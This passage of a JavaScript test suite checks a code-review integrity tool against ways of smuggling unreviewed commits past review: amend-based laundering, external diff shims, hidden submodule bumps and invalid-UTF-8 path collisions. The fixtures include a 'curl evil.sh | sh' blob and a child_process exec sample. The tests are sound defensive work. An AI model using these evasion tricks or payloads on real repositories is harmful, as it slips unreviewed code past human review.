        kind: "review-delta-v1",
        canonical_report: {
          sha256: digest(fs.readFileSync(path.join(reviewDir, "report.json"))),
          commit: reviewed,
        },
        prior_commit: reviewed,
        source: {
          commit: atBudget,
          delta_diff_sha256: digest(frozenDiffBytes(repo, reviewed, atBudget)),
        },
        result: { outcome: "passed" },
      })
    );

    const verdict = validateSupplementChain({
      root: repo.dir,
      reviewDir,
      report: { outcome: "passed", source: { commit: reviewed } },
      target: {
        source: { commit: reviewed, base_commit: base },
        changed_files: [{ path: "src/app.js" }],
      },
      currentCommit: atBudget,
    });
    assert.equal(verdict.ok, true, verdict.reason);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("a rejected delta commit stays rejected and cannot be certified by a later chain", () => {
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const fix = commitFile(repo, "src/app.js", "feature\nfix\n", "fix");

    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(path.join(reviewDir, "report.json"), "{}\n");
    const supplement = {
      schema_version: 1,
      kind: "review-delta-v1",
      canonical_report: {
        sha256: digest(fs.readFileSync(path.join(reviewDir, "report.json"))),
        commit: reviewed,
      },
      prior_commit: reviewed,
      source: {
        commit: fix,
        delta_diff_sha256: digest(frozenDiffBytes(repo, reviewed, fix)),
      },
      result: { outcome: "passed" },
    };
    fs.writeFileSync(path.join(supplementsDir, "supplement-1.json"), JSON.stringify(supplement));

    const args = {
      root: repo.dir,
      reviewDir,
      report: { outcome: "passed", source: { commit: reviewed } },
      target: {
        source: { commit: reviewed, base_commit: base },
        changed_files: [{ path: "src/app.js" }],
      },
      currentCommit: fix,
    };
    assert.equal(validateSupplementChain(args).ok, true);

    // The audit record a blocking delta review leaves behind names the very
    // commit this chain certifies.
    fs.writeFileSync(
      path.join(supplementsDir, `rejected-${fix.slice(0, 12)}-1700000000000.json`),
      JSON.stringify({
        ...supplement,
        result: { outcome: "failed", findings: [{ severity: "high" }] },
      })
    );
    const rejected = rejectedDeltaStates(repo.dir, reviewDir);
    assert.deepEqual(rejected.commits, new Set([fix]));
    assert.deepEqual(rejected.trees, new Set([repo.run("rev-parse", `${fix}^{tree}`)]));
    const afterRejection = validateSupplementChain(args);
    assert.equal(afterRejection.ok, false);
    assert.match(afterRejection.reason, /a delta review rejected/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("a rejection survives every SHA-moving no-op that leaves the tree alone", () => {
  // --amend -m, --amend --date= and --allow-empty all mint a fresh commit SHA
  // over content nobody changed. Keying a rejection on the commit alone let
  // any of them launder a blocked fix; keying on the tree does not, and a
  // genuine fix necessarily moves the tree.
  const repo = makeRepo();
  try {
    commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "feature\n", "feature");
    const fix = commitFile(repo, "src/app.js", "feature\nfix\n", "fix");

    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(
      path.join(supplementsDir, `rejected-${fix.slice(0, 12)}-1700000000000.json`),
      JSON.stringify({
        kind: "review-delta-v1",
        prior_commit: reviewed,
        source: { commit: fix, tree: repo.run("rev-parse", `${fix}^{tree}`) },
        result: { outcome: "failed", findings: [{ severity: "high" }] },
      })
    );
    const rejected = rejectedDeltaStates(repo.dir, reviewDir);

    for (const evasion of [
      ["commit", "-q", "--amend", "-m", "fix, reworded"],
      ["commit", "-q", "--amend", "--no-edit", "--date", "2001-02-03T04:05:06"],
    ]) {
      repo.run(...evasion);
      const laundered = repo.run("rev-parse", "HEAD");
      assert.notEqual(laundered, fix, `${evasion.join(" ")} must move the commit SHA`);
      assert.ok(
        rejectsCommit(repo.dir, rejected, laundered),
        `${evasion.join(" ")} must not launder a rejected commit`
      );
    }

    // An empty commit on top carries the rejected tree forward unchanged.
    repo.run("commit", "-q", "--allow-empty", "-m", "empty");
    assert.ok(rejectsCommit(repo.dir, rejected, repo.run("rev-parse", "HEAD")));

    // The escape hatch is doing the work: changed content clears the rejection.
    const genuine = commitFile(repo, "src/app.js", "feature\nreal fix\n", "actually fix it");
    assert.equal(rejectsCommit(repo.dir, rejected, genuine), false);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("a malformed rejection record fails closed instead of vanishing", () => {
  const repo = makeRepo();
  try {
    const reviewDir = path.join(repo.dir, ".pm/dev-sessions/example/review");
    const supplementsDir = path.join(reviewDir, "supplements");
    fs.mkdirSync(supplementsDir, { recursive: true });
    fs.writeFileSync(
      path.join(supplementsDir, "rejected-abcdef012345-1700000000000.json"),
      JSON.stringify({ result: { outcome: "failed" } })
    );
    assert.throws(
      () => rejectedDeltaStates(repo.dir, reviewDir),
      /does not name the commit it rejected/
    );
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("no external diff driver can forge content identity, by env or by repo config", () => {
  // An external diff driver replaces git's diff output wholesale, so a shim
  // replaying the honest reviewed diff forges any identity computed over
  // those bytes. It arrives two ways -- GIT_EXTERNAL_DIFF in the environment
  // and diff.external in a repo-local config a branch can carry -- and
  // content identity is immune to both because it never renders a diff.
  const repo = makeRepo();
  const shim = path.join(repo.dir, "shim.sh");
  try {
    const base = commitFile(repo, "base.txt", "base\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    const reviewed = commitFile(repo, "src/app.js", "reviewed\n", "reviewed");
    const reviewedDiff = frozenDiffBytes(repo, base, reviewed);

    repo.run("switch", "-q", "-C", "feature", base);
    const smuggled = commitFile(repo, "src/app.js", "smuggled payload\n", "smuggled");

    fs.writeFileSync(shim, `#!/bin/sh\ncat <<'PATCH'\n${reviewedDiff.toString("utf8")}PATCH\n`);
    fs.chmodSync(shim, 0o755);
    const source = { commit: reviewed, base_commit: base };

    assert.ok(GIT_ENV_KEYS_TO_CLEAR.includes("GIT_EXTERNAL_DIFF"));
    const restore = process.env.GIT_EXTERNAL_DIFF;
    process.env.GIT_EXTERNAL_DIFF = shim;
    try {
      const verdict = contentIdentity({ root: repo.dir, source, currentCommit: smuggled });
      assert.equal(
        verdict.ok,
        false,
        "an external diff shim must not authenticate a smuggled commit"
      );
      // The env shim really is live: an unpinned diff renders the forged patch.
      assert.equal(
        spawnSync("git", ["diff", `${base}...${smuggled}`], {
          cwd: repo.dir,
          encoding: "utf8",
        }).stdout,
        reviewedDiff.toString("utf8"),
        "fixture must actually forge the diff, or it proves nothing"
      );
    } finally {
      if (restore === undefined) delete process.env.GIT_EXTERNAL_DIFF;
      else process.env.GIT_EXTERNAL_DIFF = restore;
    }

    // diff.external survives env sanitization entirely -- it lives in the
    // repository the reviewed branch is checked out in.
    repo.run("config", "diff.external", shim);
    const configured = contentIdentity({ root: repo.dir, source, currentCommit: smuggled });
    assert.equal(configured.ok, false, "diff.external must not authenticate a smuggled commit");
    assert.match(configured.reason, /reviewed content differs at src\/app\.js/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("a submodule pointer bump cannot hide behind .gitmodules ignore = all", () => {
  // A tracked .gitmodules carrying `ignore = all` erases gitlink rows from
  // every diff git renders, so a pointer bump to hostile code was invisible
  // to a diff-shaped identity check. ls-tree stops at the submodule and emits
  // the gitlink as a leaf, so the bump is a plain object change.
  const outer = makeRepo();
  const inner = makeRepo();
  try {
    const honest = commitFile(inner, "index.js", "module.exports = 1;\n", "honest");
    const hostile = commitFile(inner, "index.js", "require('child_process').exec(x);\n", "hostile");

    const base = commitFile(outer, "base.txt", "base\n", "base");
    outer.run("switch", "-q", "-c", "feature");
    fs.writeFileSync(
      path.join(outer.dir, ".gitmodules"),
      `[submodule "vendor"]\n\tpath = vendor\n\turl = ${inner.dir}\n\tignore = all\n`
    );
    outer.run("add", ".gitmodules");
    outer.run("update-index", "--add", "--cacheinfo", `160000,${honest},vendor`);
    outer.run("commit", "-q", "-m", "vendor at honest");
    const reviewed = outer.run("rev-parse", "HEAD");

    outer.run("update-index", "--cacheinfo", `160000,${hostile},vendor`);
    outer.run("commit", "-q", "-m", "bump vendor");
    const bumped = outer.run("rev-parse", "HEAD");

    // Premise: with the submodule ignored, the two commits render the same diff.
    const rendered = (commit) =>
      spawnSync("git", ["diff", "--no-ext-diff", "--binary", `${base}...${commit}`], {
        cwd: outer.dir,
        encoding: "utf8",
      }).stdout;
    assert.equal(rendered(reviewed), rendered(bumped), "fixture must suppress the gitlink row");

    const verdict = contentIdentity({
      root: outer.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: bumped,
    });
    assert.equal(verdict.ok, false, "a suppressed gitlink bump must not authenticate");
    assert.match(verdict.reason, /reviewed content differs at vendor/);
  } finally {
    fs.rmSync(outer.dir, { recursive: true, force: true });
    fs.rmSync(inner.dir, { recursive: true, force: true });
  }
});

// A git tree may record any byte string as a path, and no filesystem is
// involved in building one -- so these fixtures write trees directly, exactly
// as a pushed branch could carry them.
function writeTree(repo, rows) {
  const payload = Buffer.concat(
    rows.map(([oid, pathBytes]) =>
      Buffer.concat([Buffer.from(`100644 blob ${oid}\t`), pathBytes, Buffer.from([0])])
    )
  );
  const result = spawnSync("git", ["mktree", "-z"], {
    cwd: repo.dir,
    input: payload,
    encoding: "utf8",
  });
  assert.equal(result.status, 0, `git mktree: ${result.stderr}`);
  return result.stdout.trim();
}

function writeBlob(repo, content) {
  const result = spawnSync("git", ["hash-object", "-w", "--stdin"], {
    cwd: repo.dir,
    input: content,
    encoding: "utf8",
  });
  assert.equal(result.status, 0, `git hash-object: ${result.stderr}`);
  return result.stdout.trim();
}

// `a\xFE` and `a\xFF` are both invalid UTF-8 and both decode to "a�".
// ls-tree -r sorts by path bytes, so SHADOWER is always read after SHADOWED.
const SHADOWED = Buffer.from([0x61, 0xfe]);
const SHADOWER = Buffer.from([0x61, 0xff]);

test("content identity keys paths on bytes, so a colliding sibling cannot shadow a rewrite", () => {
  // Decoding ls-tree output as UTF-8 maps every invalid byte sequence to the
  // same replacement character, so two distinct paths share one Map key and the
  // later one overwrites the earlier. The shadowed path then has no entry at
  // all: rewriting it changes no changed-path set and no compared object ID,
  // and a commit carrying arbitrary unreviewed content authenticates.
  const repo = makeRepo();
  try {
    const benign = writeBlob(repo, "benign\n");
    const evil = writeBlob(repo, "curl evil.sh | sh\n");
    const before = writeBlob(repo, "app v1\n");
    const after = writeBlob(repo, "app v2\n");
    const appPath = Buffer.from("app.js");

    const commitTree = (tree, parent, message) => {
      const args = ["commit-tree", tree, "-m", message];
      if (parent) args.splice(2, 0, "-p", parent);
      return repo.run(...args);
    };

    const base = commitTree(
      writeTree(repo, [
        [benign, SHADOWED],
        [benign, SHADOWER],
        [before, appPath],
      ]),
      null,
      "base"
    );
    // The honest change: app.js only.
    const reviewed = commitTree(
      writeTree(repo, [
        [benign, SHADOWED],
        [benign, SHADOWER],
        [after, appPath],
      ]),
      base,
      "reviewed"
    );
    // The forgery: the same app.js change plus a rewrite of the shadowed path.
    const forged = commitTree(
      writeTree(repo, [
        [evil, SHADOWED],
        [benign, SHADOWER],
        [after, appPath],
      ]),
      base,
      "forged"
    );

    // Premise: under a UTF-8 decode the two trees are indistinguishable.
    const decodedKeys = (commit) =>
      spawnSync("git", ["ls-tree", "-r", "-z", `${commit}^{tree}`], { cwd: repo.dir })
        .stdout.toString("utf8")
        .split("\0")
        .filter(Boolean)
        .map((record) => record.split("\t")[1]);
    assert.deepEqual(
      decodedKeys(reviewed),
      decodedKeys(forged),
      "fixture must be invisible to a UTF-8 decode, or it proves nothing"
    );
    assert.notEqual(
      repo.run("rev-parse", `${reviewed}^{tree}`),
      repo.run("rev-parse", `${forged}^{tree}`)
    );

    const verdict = contentIdentity({
      root: repo.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: forged,
    });
    assert.equal(verdict.ok, false, "a shadowed rewrite must not authenticate");
    // Byte keying restores the shadowed path to the inventory, so the forged
    // commit is caught changing a path the reviewed one never touched.
    assert.match(verdict.reason, /outside the reviewed change set/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("content identity rejects a relocation between paths a UTF-8 decode would merge", () => {
  // The same collision, used to move reviewed content to an unreviewed path
  // rather than to hide a rewrite.
  const repo = makeRepo();
  try {
    const keep = writeBlob(repo, "keep\n");
    const payload = writeBlob(repo, "payload\n");
    const keepPath = Buffer.from("keep.txt");
    const commitTree = (tree, parent, message) =>
      repo.run("commit-tree", tree, "-p", parent, "-m", message);

    const base = repo.run("commit-tree", writeTree(repo, [[keep, keepPath]]), "-m", "base");
    const reviewed = commitTree(
      writeTree(repo, [
        [payload, SHADOWED],
        [keep, keepPath],
      ]),
      base,
      "reviewed"
    );
    const relocated = commitTree(
      writeTree(repo, [
        [payload, SHADOWER],
        [keep, keepPath],
      ]),
      base,
      "relocated"
    );

    const verdict = contentIdentity({
      root: repo.dir,
      source: { commit: reviewed, base_commit: base },
      currentCommit: relocated,
    });
    assert.equal(verdict.ok, false, "a relocation onto a colliding path must not authenticate");
    assert.match(verdict.reason, /outside the reviewed change set/);
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("the trust set overrides the rendering knobs that survive the -c pins", () => {
  // color.ui and diff.orderFile both move the bytes of an otherwise fully
  // pinned invocation, and neither is reachable from the -c set: an empty
  // diff.orderFile= is a fatal error rather than a disable. Both are overridden
  // by flags instead, and both overrides must be no-ops on a default clone.
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "a.txt", "one\n", "base");
    fs.writeFileSync(path.join(repo.dir, "b.txt"), "one\n");
    repo.run("add", "-A");
    repo.run("commit", "-q", "-m", "second file");
    repo.run("switch", "-q", "-c", "feature");
    fs.writeFileSync(path.join(repo.dir, "a.txt"), "two\n");
    fs.writeFileSync(path.join(repo.dir, "b.txt"), "two\n");
    repo.run("add", "-A");
    repo.run("commit", "-q", "-m", "edit both");
    const head = repo.run("rev-parse", "HEAD");
    const clean = frozenDiffBytes(repo, base, head);
    assert.ok(clean.length > 0, "fixture must render a non-empty diff");

    const orderFile = path.join(repo.dir, "order.txt");
    fs.writeFileSync(orderFile, "b.txt\na.txt\n");
    for (const [key, value] of [
      ["color.ui", "always"],
      ["diff.orderFile", orderFile],
    ]) {
      repo.run("config", key, value);
      // The knob is live: without its override the pinned bytes move.
      const unguarded = spawnSync(
        "git",
        trustedDiffArgs("--binary", `${base}...${head}`).filter(
          (arg) => arg !== "--no-color" && arg !== "-O" && arg !== os.devNull
        ),
        { cwd: repo.dir, maxBuffer: 64 * 1024 * 1024 }
      );
      assert.equal(unguarded.status, 0);
      assert.notEqual(
        digest(unguarded.stdout),
        digest(clean),
        `${key} must actually move unguarded bytes, or it proves nothing`
      );
      assert.equal(
        digest(frozenDiffBytes(repo, base, head)),
        digest(clean),
        `${key} must not move the trusted bytes`
      );
      repo.run("config", "--unset", key);
    }
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});

test("the pinned diff config is a no-op on a default repository", () => {
  // Each pinned value must be git's own default, or the pins would silently
  // invalidate delta hashes frozen before this change.
  const repo = makeRepo();
  try {
    const base = commitFile(repo, "a.js", "one\ntwo\nthree\n", "base");
    repo.run("switch", "-q", "-c", "feature");
    repo.run("mv", "a.js", "b.js");
    fs.appendFileSync(path.join(repo.dir, "b.js"), "four\n");
    repo.run("add", "-A");
    repo.run("commit", "-q", "-m", "rename and extend");
    const head = repo.run("rev-parse", "HEAD");

    const range = `${base}...${head}`;
    const pinned = spawnSync("git", trustedDiffArgs("--binary", range), { cwd: repo.dir });
    const bare = spawnSync(
      "git",
      ["diff", "--no-ext-diff", "--no-textconv", "--find-renames", "--binary", range],
      { cwd: repo.dir }
    );
    assert.equal(pinned.status, 0);
    assert.equal(bare.status, 0);
    assert.ok(pinned.stdout.length > 0, "fixture must render a non-empty diff");
    assert.equal(digest(pinned.stdout), digest(bare.stdout));
  } finally {
    fs.rmSync(repo.dir, { recursive: true, force: true });
  }
});
